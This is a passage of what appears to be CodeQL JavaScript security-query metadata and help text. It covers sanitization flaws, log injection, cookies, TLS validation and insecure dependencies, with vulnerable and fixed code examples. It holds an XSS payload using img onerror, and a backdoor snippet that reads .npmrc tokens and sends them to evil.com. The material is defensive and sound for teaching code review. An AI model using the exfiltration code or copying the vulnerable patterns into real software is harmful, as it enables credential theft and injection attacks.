  queryHelp: "# Incomplete multi-character sanitization\nSanitizing untrusted input\
    \ is a common technique for preventing injection attacks and other security vulnerabilities.\
    \ Regular expressions are often used to perform this sanitization. However, when\
    \ the regular expression matches multiple consecutive characters, replacing it\
    \ just once can result in the unsafe text reappearing in the sanitized input.\n\
    \nAttackers can exploit this issue by crafting inputs that, when sanitized with\
    \ an ineffective regular expression, still contain malicious code or content.\
    \ This can lead to code execution, data exposure, or other vulnerabilities.\n\n\
    \n## Recommendation\nTo prevent this issue, it is highly recommended to use a\
    \ well-tested sanitization library whenever possible. These libraries are more\
    \ likely to handle corner cases and ensure effective sanitization.\n\nIf a library\
    \ is not an option, you can consider alternative strategies to fix the issue.\
    \ For example, applying the regular expression replacement repeatedly until no\
    \ more replacements can be performed, or rewriting the regular expression to match\
    \ single characters instead of the entire unsafe text.\n\n\n## Example\nConsider\
    \ the following JavaScript code that aims to remove all HTML comment start and\
    \ end tags:\n\n```javascript\n\nstr.replace(/<!--|--!?>/g, \"\");   \n\n```\n\
    Given the input string \"&lt;!&lt;!--- comment ---&gt;&gt;\", the output will\
    \ be \"&lt;!-- comment --&gt;\", which still contains an HTML comment.\n\nOne\
    \ possible fix for this issue is to apply the regular expression replacement repeatedly\
    \ until no more replacements can be performed. This ensures that the unsafe text\
    \ does not re-appear in the sanitized input, effectively removing all instances\
    \ of the targeted pattern:\n\n```javascript\n\nfunction removeHtmlComments(input)\
    \ {  \n  let previous;  \n  do {  \n    previous = input;  \n    input = input.replace(/<!--|--!?>/g,\
    \ \"\");  \n  } while (input !== previous);  \n  return input;  \n}  \n\n```\n\
    \n## Example\nAnother example is the following regular expression intended to\
    \ remove script tags:\n\n```javascript\n\nstr.replace(/<script\\b[^<]*(?:(?!<\\\
    /script>)<[^<]*)*<\\/script>/g, \"\");  \n\n```\nIf the input string is \"&lt;scrip&lt;script&gt;is\
    \ removed&lt;/script&gt;t&gt;alert(123)&lt;/script&gt;\", the output will be \"\
    &lt;script&gt;alert(123)&lt;/script&gt;\", which still contains a script tag.\n\
    \nA fix for this issue is to rewrite the regular expression to match single characters\
    \ (\"&lt;\" and \"&gt;\") instead of the entire unsafe text. This simplifies the\
    \ sanitization process and ensures that all potentially unsafe characters are\
    \ removed:\n\n```javascript\n\nfunction removeAllHtmlTags(input) {  \n  return\
    \ input.replace(/<|>/g, \"\");  \n}\n\n```\nAnother potential fix is to use the\
    \ popular `sanitize-html` npm library. It keeps most of the safe HTML tags while\
    \ removing all unsafe tags and attributes.\n\n```javascript\n\nconst sanitizeHtml\
    \ = require(\"sanitize-html\");\nfunction removeAllHtmlTags(input) {  \n  return\
    \ sanitizeHtml(input);  \n}\n\n```\n\n## Example\nLastly, consider a path sanitizer\
    \ using the regular expression `/\\.\\.\\//`:\n\n```javascript\n\nstr.replace(/\\\
    .\\.\\//g, \"\");  \n\n```\nThe regular expression attempts to strip out all occurrences\
    \ of `/../` from `str`. This will not work as expected: for the string `/./.././`,\
    \ for example, it will remove the single occurrence of `/../` in the middle, but\
    \ the remainder of the string then becomes `/../`, which is another instance of\
    \ the substring we were trying to remove.\n\nA possible fix for this issue is\
    \ to use the \"sanitize-filename\" npm library for path sanitization. This library\
    \ is specifically designed to handle path sanitization, and should handle all\
    \ corner cases and ensure effective sanitization:\n\n```javascript\n\nconst sanitize\
    \ = require(\"sanitize-filename\");  \n  \nfunction sanitizePath(input) {  \n\
    \  return sanitize(input);  \n}  \n\n```\n\n## References\n* OWASP Top 10: [A1\
    \ Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* Stack\
    \ Overflow: [Removing all script tags from HTML with JS regular expression](https://stackoverflow.com/questions/6659351/removing-all-script-tags-from-html-with-js-regular-expression).\n\
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n\
    * Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/IncompleteSanitization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/IncompleteSanitization.bqrs
  metadata:
    name: Incomplete string escaping or encoding
    description: |-
      A string transformer that does not replace or escape all occurrences of a
                    meta-character may be ineffective.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/incomplete-sanitization
    tags: |-
      correctness
             security
             external/cwe/cwe-020
             external/cwe/cwe-080
             external/cwe/cwe-116
  queryHelp: |
    # Incomplete string escaping or encoding
    Sanitizing untrusted input is a common technique for preventing injection attacks such as SQL injection or cross-site scripting. Usually, this is done by escaping meta-characters such as quotes in a domain-specific way so that they are treated as normal characters.

    However, directly using the string `replace` method to perform escaping is notoriously error-prone. Common mistakes include only replacing the first occurrence of a meta-character, or backslash-escaping various meta-characters but not the backslash itself.

    In the former case, later meta-characters are left undisturbed and can be used to subvert the sanitization. In the latter case, preceding a meta-character with a backslash leads to the backslash being escaped, but the meta-character appearing un-escaped, which again makes the sanitization ineffective.

    Even if the escaped string is not used in a security-critical context, incomplete escaping may still have undesirable effects, such as badly rendered or confusing output.


    ## Recommendation
    Use a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.

    An even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.

    Otherwise, make sure to use a regular expression with the `g` flag to ensure that all occurrences are replaced, and remember to escape backslashes if applicable.


    ## Example
    For example, assume that we want to embed a user-controlled string `accountNumber` into a SQL query as part of a string literal. To avoid SQL injection, we need to ensure that the string does not contain un-escaped single-quote characters. The following function attempts to ensure this by doubling single quotes, and thereby escaping them:


    ```javascript
    function escapeQuotes(s) {
      return s.replace("'", "''");
    }

    ```
    As written, this sanitizer is ineffective: if the first argument to `replace` is a string literal (as in this case), only the *first* occurrence of that string is replaced.

    As mentioned above, the function `escapeQuotes` should be replaced with a purpose-built sanitization library, such as the npm module `sqlstring`. Many other sanitization libraries are available from npm and other sources.

    If this is not an option, `escapeQuotes` should be rewritten to use a regular expression with the `g` ("global") flag instead:


    ```javascript
    function escapeQuotes(s) {
      return s.replace(/'/g, "''");
    }

    ```
    Note that it is very important to include the global flag: `s.replace(/'/, "''")` *without* the global flag is equivalent to the first example above and only replaces the first quote.


    ## References
    * OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).
    * npm: [sqlstring](https://www.npmjs.com/package/sqlstring) package.
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
    * Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/UnsafeHtmlExpansion.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/UnsafeHtmlExpansion.bqrs
  metadata:
    name: Unsafe expansion of self-closing HTML tag
    description: |-
      Using regular expressions to expand self-closing HTML
                    tags may lead to cross-site scripting vulnerabilities.
    kind: problem
    problem.severity: warning
    security-severity: 6.1
    precision: very-high
    id: js/unsafe-html-expansion
    tags: |-
      correctness
             security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: "# Unsafe expansion of self-closing HTML tag\nSanitizing untrusted input\
    \ for HTML meta-characters is a common technique for preventing cross-site scripting\
    \ attacks. But even a sanitized input can be dangerous to use if it is modified\
    \ further before a browser treats it as HTML. A seemingly innocent transformation\
    \ that expands a self-closing HTML tag from `<div attr=\"{sanitized}\"/>` to `<div\
    \ attr=\"{sanitized}\"></div>` may in fact cause cross-site scripting vulnerabilities.\n\
    \n\n## Recommendation\nUse a well-tested sanitization library if at all possible,\
    \ and avoid modifying sanitized values further before treating them as HTML.\n\
    \nAn even safer alternative is to design the application so that sanitization\
    \ is not needed, for instance by using HTML templates that are explicit about\
    \ the values they treat as HTML.\n\n\n## Example\nThe following function transforms\
    \ a self-closing HTML tag to a pair of open/close tags. It does so for all non-`img`\
    \ and non-`area` tags, by using a regular expression with two capture groups.\
    \ The first capture group corresponds to the name of the tag, and the second capture\
    \ group to the content of the tag.\n\n\n```javascript\nfunction expandSelfClosingTags(html)\
    \ {\n\tvar rxhtmlTag = /<(?!img|area)(([a-z][^\\w\\/>]*)[^>]*)\\/>/gi;\n\treturn\
    \ html.replace(rxhtmlTag, \"<$1></$2>\"); // BAD\n}\n\n```\nWhile it is generally\
    \ known regular expressions are ill-suited for parsing HTML, variants of this\
    \ particular transformation pattern have long been considered safe.\n\nHowever,\
    \ the function is not safe. As an example, consider the following string:\n\n\n\
    ```html\n<div alt=\"\n<x\" title=\"/>\n<img src=url404 onerror=alert(1)>\"/>\n\
    \n```\nWhen the above function transforms the string, it becomes a string that\
    \ results in an alert when a browser treats it as HTML.\n\n\n```html\n<div alt=\"\
    \n<x\" title=\"></x\" >\n<img src=url404 onerror=alert(1)>\"/>\n\n```\n\n## References\n\
    * jQuery: [Security fixes in jQuery 3.5.0](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n\
    * OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
    * OWASP [Types of Cross-Site](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n\
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-117/LogInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-117/LogInjection.bqrs
  metadata:
    name: Log injection
    description: |-
      Building log entries from user-controlled sources is vulnerable to
                    insertion of forged log entries by a malicious user.
    kind: path-problem
    problem.severity: error
    security-severity: 6.1
    precision: medium
    id: js/log-injection
    tags: |-
      security
             external/cwe/cwe-117
  queryHelp: |
    # Log injection
    If unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.

    Forgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.


    ## Recommendation
    User input should be suitably sanitized before it is logged.

    If the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.

    For log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.


    ## Example
    In the first example, a username, provided by the user, is logged using \`console.info\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \`console.error\`. If a malicious user provides \`username=Guest%0a\[INFO\]+User:+Admin%0a\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \`\[INFO\]+User:+Admin\`.


    ```javascript
    const http = require('http');
    const url = require('url');

    const server = http.createServer((req, res) => {
        let q = url.parse(req.url, true);

        console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is
    })

    server.listen(3000, '127.0.0.1', () => {});

    ```
    In the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.


    ```javascript
    const http = require('http');
    const url = require('url');

    const server = http.createServer((req, res) => {
        let q = url.parse(req.url, true);

        // GOOD: remove newlines from user controlled input before logging
        let username = q.query.username.replace(/\n|\r/g, "");

        console.info(`[INFO] User: ${username}`);
    });

    server.listen(3000, '127.0.0.1', () => {});

    ```

    ## References
    * OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).
    * Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-1275/SameSiteNoneCookie.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-1275/SameSiteNoneCookie.bqrs
  metadata:
    name: Sensitive cookie without SameSite restrictions
    description: |-
      Sensitive cookies where the SameSite attribute is set to "None" can
                    in some cases allow for Cross-Site Request Forgery (CSRF) attacks.
    kind: problem
    problem.severity: warning
    security-severity: 5.0
    precision: medium
    id: js/samesite-none-cookie
    tags: |-
      security
             external/cwe/cwe-1275
  queryHelp: |
    # Sensitive cookie without SameSite restrictions
    Authentication cookies where the SameSite attribute is set to "None" can potentially be used to perform Cross-Site Request Forgery (CSRF) attacks if no other CSRF protections are in place.

    With SameSite set to "None", a third party website may create an authorized cross-site request that includes the cookie. Such a cross-site request can allow that website to perform actions on behalf of a user.


    ## Recommendation
    Set the `SameSite` attribute to `Strict` on all sensitive cookies.


    ## Example
    The following example stores an authentication token in a cookie where the `SameSite` attribute is set to `None`.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly; SameSite=None`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```
    To prevent the cookie from being included in cross-site requests, set the `SameSite` attribute to `Strict`.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly; SameSite=Strict`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```

    ## References
    * MDN Web Docs: [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite).
    * OWASP: [SameSite](https://owasp.org/www-community/SameSite).
    * Common Weakness Enumeration: [CWE-1275](https://cwe.mitre.org/data/definitions/1275.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-134/TaintedFormatString.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-134/TaintedFormatString.bqrs
  metadata:
    name: Use of externally-controlled format string
    description: Using external input in format strings can lead to garbled output.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.3
    precision: high
    id: js/tainted-format-string
    tags: |-
      security
             external/cwe/cwe-134
  queryHelp: |
    # Use of externally-controlled format string
    Functions like the Node.js standard library function `util.format` accept a format string that is used to format the remaining arguments by providing inline format specifiers. If the format string contains unsanitized input from an untrusted source, then that string may contain unexpected format specifiers that cause garbled output.


    ## Recommendation
    Either sanitize the input before including it in the format string, or use a `%s` specifier in the format string, and pass the untrusted data as corresponding argument.


    ## Example
    The following program snippet logs information about an unauthorized access attempt. The log message includes the user name, and the user's IP address is passed as an additional argument to `console.log` to be appended to the message:


    ```javascript
    const app = require("express")();

    app.get("unauthorized", function handler(req, res) {
      let user = req.query.user;
      let ip = req.connection.remoteAddress;
      console.log("Unauthorized access attempt by " + user, ip);
    });

    ```
    However, if a malicious user provides `%d` as their user name, `console.log` will instead attempt to format the `ip` argument as a number. Since IP addresses are not valid numbers, the result of this conversion is `NaN`. The resulting log message will read "Unauthorized access attempt by NaN", missing all the information that it was trying to log in the first place.

    Instead, the user name should be included using the `%s` specifier:


    ```javascript
    const app = require("express")();

    app.get("unauthorized", function handler(req, res) {
      let user = req.query.user;
      let ip = req.connection.remoteAddress;
      console.log("Unauthorized access attempt by %s", user, ip);
    });

    ```

    ## References
    * Node.js Documentation: [util.format](https://nodejs.org/api/util.html#util_util_format_format_args).
    * Common Weakness Enumeration: [CWE-134](https://cwe.mitre.org/data/definitions/134.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-178/CaseSensitiveMiddlewarePath.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-178/CaseSensitiveMiddlewarePath.bqrs
  metadata:
    name: Case-sensitive middleware path
    description: Middleware with case-sensitive paths do not protect endpoints with
      case-insensitive paths.
    kind: problem
    problem.severity: warning
    security-severity: 7.3
    precision: high
    id: js/case-sensitive-middleware-path
    tags: |-
      security
             external/cwe/cwe-178
  queryHelp: |
    # Case-sensitive middleware path
    Using a case-sensitive regular expression path in a middleware route enables an attacker to bypass that middleware when accessing an endpoint with a case-insensitive path. Paths specified using a string are case-insensitive, whereas regular expressions are case-sensitive by default.


    ## Recommendation
    When using a regular expression as a middleware path, make sure the regular expression is case-insensitive by adding the `i` flag.


    ## Example
    The following example restricts access to paths in the `/admin` path to users logged in as administrators:


    ```javascript
    const app = require('express')();

    app.use(/\/admin\/.*/, (req, res, next) => {
        if (!req.user.isAdmin) {
            res.status(401).send('Unauthorized');
        } else {
            next();
        }
    });

    app.get('/admin/users/:id', (req, res) => {
        res.send(app.database.users[req.params.id]);
    });

    ```
    A path such as `/admin/users/45` can only be accessed by an administrator. However, the path `/ADMIN/USERS/45` can be accessed by anyone because the upper-case path doesn't match the case-sensitive regular expression, whereas Express considers it to match the path string `/admin/users`.

    The issue can be fixed by adding the `i` flag to the regular expression:


    ```javascript
    const app = require('express')();

    app.use(/\/admin\/.*/i, (req, res, next) => {
        if (!req.user.isAdmin) {
            res.status(401).send('Unauthorized');
        } else {
            next();
        }
    });

    app.get('/admin/users/:id', (req, res) => {
        res.send(app.database.users[req.params.id]);
    });

    ```

    ## References
    * MDN [Regular Expression Flags](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions#advanced_searching_with_flags).
    * Common Weakness Enumeration: [CWE-178](https://cwe.mitre.org/data/definitions/178.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-200/FileAccessToHttp.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-200/FileAccessToHttp.bqrs
  metadata:
    name: File data in outbound network request
    description: Directly sending file data in an outbound network request can indicate
      unauthorized information disclosure.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.5
    precision: medium
    id: js/file-access-to-http
    tags: |-
      security
             external/cwe/cwe-200
  queryHelp: |
    # File data in outbound network request
    Sending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.


    ## Recommendation
    Examine the highlighted code closely to ensure that it is behaving as intended.


    ## Example
    The following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.


    ```javascript
    var fs = require("fs"),
        https = require("https");

    var content = fs.readFileSync(".npmrc", "utf8");
    https.get({
      hostname: "evil.com",
      path: "/upload",
      method: "GET",
      headers: { Referer: content }
    }, () => { });

    ```

    ## References
    * ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).
    * OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).
    * OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).
    * Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-200/PrivateFileExposure.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-200/PrivateFileExposure.bqrs
  metadata:
    name: Exposure of private files
    description: |-
      Exposing a node_modules folder, or the project folder to the public, can cause exposure
                    of private information.
    kind: problem
    problem.severity: warning
    security-severity: 6.5
    id: js/exposure-of-private-files
    tags: |-
      security
             external/cwe/cwe-200
             external/cwe/cwe-219
             external/cwe/cwe-548
    precision: high
  queryHelp: |
    # Exposure of private files
    Libraries like `express` provide easy methods for serving entire directories of static files from a web server. However, using these can sometimes lead to accidental information exposure. If for example the `node_modules` folder is served, then an attacker can access the `_where` field from a `package.json` file, which gives access to the absolute path of the file.


    ## Recommendation
    Limit which folders of static files are served from a web server.


    ## Example
    In the example below, all the files from the `node_modules` are served. This allows clients to easily access all the files inside that folder, which includes potentially private information inside `package.json` files.


    ```javascript

    var express = require('express');

    var app = express();

    app.use('/node_modules', express.static(path.resolve(__dirname, '../node_modules')));
    ```
    The issue has been fixed below by only serving specific folders within the `node_modules` folder.


    ```javascript

    var express = require('express');

    var app = express();

    app.use("jquery", express.static('./node_modules/jquery/dist'));
    app.use("bootstrap", express.static('./node_modules/bootstrap/dist'));
    ```

    ## References
    * OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).
    * Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).
    * Common Weakness Enumeration: [CWE-219](https://cwe.mitre.org/data/definitions/219.html).
    * Common Weakness Enumeration: [CWE-548](https://cwe.mitre.org/data/definitions/548.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-201/PostMessageStar.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-201/PostMessageStar.bqrs
  metadata:
    name: Cross-window communication with unrestricted target origin
    description: |-
      When sending sensitive information to another window using `postMessage`,
                    the origin of the target window should be restricted to avoid unintentional
                    information leaks.
    kind: path-problem
    problem.severity: error
    security-severity: 4.3
    precision: high
    id: js/cross-window-information-leak
    tags: |-
      security
             external/cwe/cwe-201
             external/cwe/cwe-359
  queryHelp: |
    # Cross-window communication with unrestricted target origin
    The `window.postMessage` method allows different windows or iframes to communicate directly, even if they were loaded from different origins, circumventing the usual same-origin policy.

    The sender of the message can restrict the origin of the receiver by specifying a target origin. If the receiver window does not come from this origin, the message is not sent.

    Alternatively, the sender can specify a target origin of `'*'`, which means that any origin is acceptable and the message is always sent.

    This feature should not be used if the message being sent contains sensitive data such as user credentials: the target window may have been loaded from a malicious site, to which the data would then become available.


    ## Recommendation
    If possible, specify a target origin when using `window.postMessage`. Alternatively, encrypt the sensitive data before sending it to prevent an unauthorized receiver from accessing it.


    ## Example
    The following example code sends user credentials (in this case, their user name) to `window.parent` without checking its origin. If a malicious site loads the page containing this code into an iframe it would be able to gain access to the user name.


    ```javascript
    window.parent.postMessage(userName, '*');

    ```
    To prevent this from happening, the origin of the target window should be restricted, as in this example:


    ```javascript
    window.parent.postMessage(userName, 'https://github.com');

    ```

    ## References
    * Mozilla Developer Network: [Window.postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).
    * Mozilla Developer Network: [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy).
    * Common Weakness Enumeration: [CWE-201](https://cwe.mitre.org/data/definitions/201.html).
    * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-209/StackTraceExposure.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-209/StackTraceExposure.bqrs
  metadata:
    name: Information exposure through a stack trace
    description: |-
      Propagating stack trace information to an external user can
                    unintentionally reveal implementation details that are useful
                    to an attacker for developing a subsequent exploit.
    kind: path-problem
    problem.severity: warning
    security-severity: 5.4
    precision: very-high
    id: js/stack-trace-exposure
    tags: |-
      security
             external/cwe/cwe-209
             external/cwe/cwe-497
  queryHelp: |
    # Information exposure through a stack trace
    Software developers often add stack traces to error messages, as a debugging aid. Whenever that error message occurs for an end user, the developer can use the stack trace to help identify how to fix the problem. In particular, stack traces can tell the developer more about the sequence of events that led to a failure, as opposed to merely the final state of the software when the error occurred.

    Unfortunately, the same information can be useful to an attacker. The sequence of function names in a stack trace can reveal the structure of the application as well as any internal components it relies on. Furthermore, the error message at the top of a stack trace can include information such as server-side file names and SQL code that the application relies on, allowing an attacker to fine-tune a subsequent injection attack.


    ## Recommendation
    Send the user a more generic error message that reveals less information. Either suppress the stack trace entirely, or log it only on the server.


    ## Example
    In the following example, an exception is caught and its stack trace is sent back to the remote user as part of the HTTP response. As such, the user is able to see a detailed stack trace, which may contain sensitive information.


    ```javascript
    var http = require('http');

    http.createServer(function onRequest(req, res) {
      var body;
      try {
        body = handleRequest(req);
      }
      catch (err) {
        res.statusCode = 500;
        res.setHeader("Content-Type", "text/plain");
        res.end(err.stack); // NOT OK
        return;
      }
      res.statusCode = 200;
      res.setHeader("Content-Type", "application/json");
      res.setHeader("Content-Length", body.length);
      res.end(body);
    }).listen(3000);

    ```
    Instead, the stack trace should be logged only on the server. That way, the developers can still access and use the error log, but remote users will not see the information:


    ```javascript
    var http = require('http');

    http.createServer(function onRequest(req, res) {
      var body;
      try {
        body = handleRequest(req);
      }
      catch (err) {
        res.statusCode = 500;
        res.setHeader("Content-Type", "text/plain");
        log("Exception occurred", err.stack);
        res.end("An exception occurred"); // OK
        return;
      }
      res.statusCode = 200;
      res.setHeader("Content-Type", "application/json");
      res.setHeader("Content-Length", body.length);
      res.end(body);
    }).listen(3000);

    ```

    ## References
    * OWASP: [Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling).
    * Common Weakness Enumeration: [CWE-209](https://cwe.mitre.org/data/definitions/209.html).
    * Common Weakness Enumeration: [CWE-497](https://cwe.mitre.org/data/definitions/497.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-295/DisablingCertificateValidation.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-295/DisablingCertificateValidation.bqrs
  metadata:
    name: Disabling certificate validation
    description: Disabling cryptographic certificate validation can cause security
      vulnerabilities.
    kind: problem
    problem.severity: error
    security-severity: 7.5
    precision: very-high
    id: js/disabling-certificate-validation
    tags: |-
      security
             external/cwe/cwe-295
             external/cwe/cwe-297
  queryHelp: |
    # Disabling certificate validation
    Certificate validation is the standard authentication method of a secure TLS connection. Without it, there is no guarantee about who the other party of a TLS connection is, making man-in-the-middle attacks more likely to occur

    When testing software that uses TLS connections, it may be useful to disable the certificate validation temporarily. But disabling it in production environments is strongly discouraged, unless an alternative method of authentication is used.


    ## Recommendation
    Do not disable certificate validation for TLS connections.


    ## Example
    The following example shows a HTTPS connection that transfers confidential information to a remote server. But the connection is not secure since the `rejectUnauthorized` option of the connection is set to `false`. As a consequence, anyone can impersonate the remote server, and receive the confidential information.


    ```javascript
    let https = require("https");

    https.request(
      {
        hostname: "secure.my-online-bank.com",
        port: 443,
        method: "POST",
        path: "send-confidential-information",
        rejectUnauthorized: false // BAD
      },
      response => {
        // ... communicate with secure.my-online-bank.com
      }
    );

    ```
    To make the connection secure, the `rejectUnauthorized` option should have its default value, or be explicitly set to `true`.


    ## References
    * Wikipedia: [Transport Layer Security (TLS)](https://en.wikipedia.org/wiki/Transport_Layer_Security)
    * Wikipedia: [Man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
    * Node.js: [TLS (SSL)](https://nodejs.org/api/tls.html)
    * Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).
    * Common Weakness Enumeration: [CWE-297](https://cwe.mitre.org/data/definitions/297.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-300/InsecureDependencyResolution.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-300/InsecureDependencyResolution.bqrs
  metadata:
    name: Dependency download using unencrypted communication channel
    description: |-
      Using unencrypted protocols to fetch dependencies can leave an application
                    open to man-in-the-middle attacks.
    kind: problem
    problem.severity: warning
    security-severity: 8.1
    precision: high
    id: js/insecure-dependency
    tags: |-
      security
             external/cwe/cwe-300
             external/cwe/cwe-319
             external/cwe/cwe-494
             external/cwe/cwe-829
  queryHelp: |
    # Dependency download using unencrypted communication channel
    Using an insecure protocol like HTTP or FTP to download build dependencies makes the build process vulnerable to a man-in-the-middle (MITM) attack.

    This can allow attackers to inject malicious code into the downloaded dependencies, and thereby infect the build artifacts and execute arbitrary code on the machine building the artifacts.


    ## Recommendation
    Always use a secure protocol, such as HTTPS or SFTP, when downloading artifacts from an URL.


    ## Example
    The below example shows a `package.json` file that downloads a dependency using the insecure HTTP protocol.


    ```json
    {
      "name": "example-project",
      "dependencies": {
        "unencrypted": "http://example.org/foo/tarball/release/0.0.1",
        "lodash": "^4.0.0"
      }
    }
    ```
    The fix is to change the protocol to HTTPS.


    ```json
    {
      "name": "example-project",
      "dependencies": {
        "unencrypted": "https://example.org/foo/tarball/release/0.0.1",
        "lodash": "^4.0.0"
      }
    }
    ```

    ## References
    * Jonathan Leitschuh: [ Want to take over the Java ecosystem? All you need is a MITM! ](https://infosecwriteups.com/want-to-take-over-the-java-ecosystem-all-you-need-is-a-mitm-1fc329d898fb)
    * Max Veytsman: [ How to take over the computer of any Java (or Closure or Scala) Developer. ](https://max.computer/blog/how-to-take-over-the-computer-of-any-java-or-clojure-or-scala-developer/)
    * Wikipedia: [Supply chain attack.](https://en.wikipedia.org/wiki/Supply_chain_attack)
    * Wikipedia: [Man-in-the-middle attack.](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
    * Common Weakness Enumeration: [CWE-300](https://cwe.mitre.org/data/definitions/300.html).
    * Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).
    * Common Weakness Enumeration: [CWE-494](https://cwe.mitre.org/data/definitions/494.html).
    * Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-312/BuildArtifactLeak.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-312/BuildArtifactLeak.bqrs
  metadata:
    name: Storage of sensitive information in build artifact
    description: |-
      Including sensitive information in a build artifact can
                    expose it to an attacker.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/build-artifact-leak
    tags: |-
      security
             external/cwe/cwe-312
             external/cwe/cwe-315
             external/cwe/cwe-359
  queryHelp: |
    # Storage of sensitive information in build artifact
